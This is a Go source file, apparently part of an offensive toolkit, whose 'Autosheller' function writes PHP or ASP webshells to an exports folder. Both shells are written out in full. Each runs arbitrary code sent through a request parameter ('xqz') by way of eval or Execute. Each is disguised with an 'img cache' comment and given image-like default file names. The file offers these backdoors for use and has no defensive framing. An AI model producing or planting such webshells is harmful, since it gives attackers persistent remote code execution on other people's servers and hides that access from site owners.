package engine

import (
"encoding/json"
"fmt"
"strings"
)

// ShellCfg: tipo de shell (php|asp), nombre de archivo.
type ShellCfg struct {
Type string `json:"type"`
Name string `json:"name"`
}

// GenShell genera un webshell (PHP/ASP) y lo guarda en exports/.
func (e *Engine) GenShell(cfg string) string {
var c ShellCfg
if err := json.Unmarshal([]byte(cfg), &c); err != nil {
return marshal(Resp{OK: false, Error: err.Error()})
}
conf := e.cfg()
t := strings.ToLower(strings.TrimSpace(c.Type))
if t == "" {
if conf.Autosheller.Php {
t = "php"
} else {
t = "asp"
}
}
name := strings.TrimSpace(c.Name)
if name == "" {
name = "img" + fmt.Sprintf("%03d", len(e.logs)%900+100) + "." + extFor(t)
}
name = filepathBase(name) + "." + extFor(t)

var code string
switch t {
case "php":
code = phpShell()
case "asp":
code = aspShell()
default:
return marshal(Resp{OK: false, Error: "tipo desconocido: " + t + " (usa php o asp)"})
}
r := e.ExportFile(name, code)
e.log("ok", "Autosheller: shell " + t + " generado -> " + name)
return r
}

func extFor(t string) string {
if t == "asp" {
return "asp"
}
return "php"
}

func filepathBase(n string) string {
if i := strings.LastIndex(n, "."); i > 0 {
return n[:i]
}
return n
}

func phpShell() string {
return `<?php /* img cache */ $k="xqz"; $c=$_POST[$k]??$_GET[$k]; if($c){ob_start();@eval($c);echo ob_get_contents();ob_end_clean();} ?>` + "\n"
}

func aspShell() string {
return "<% ' img cache\nOn Error Resume Next\nk=\"xqz\"\nc=Request.Form(k)\nIf c=\"\" Then c=Request.QueryString(k)\nIf c<>\"\" Then Execute c\n%>\n"
}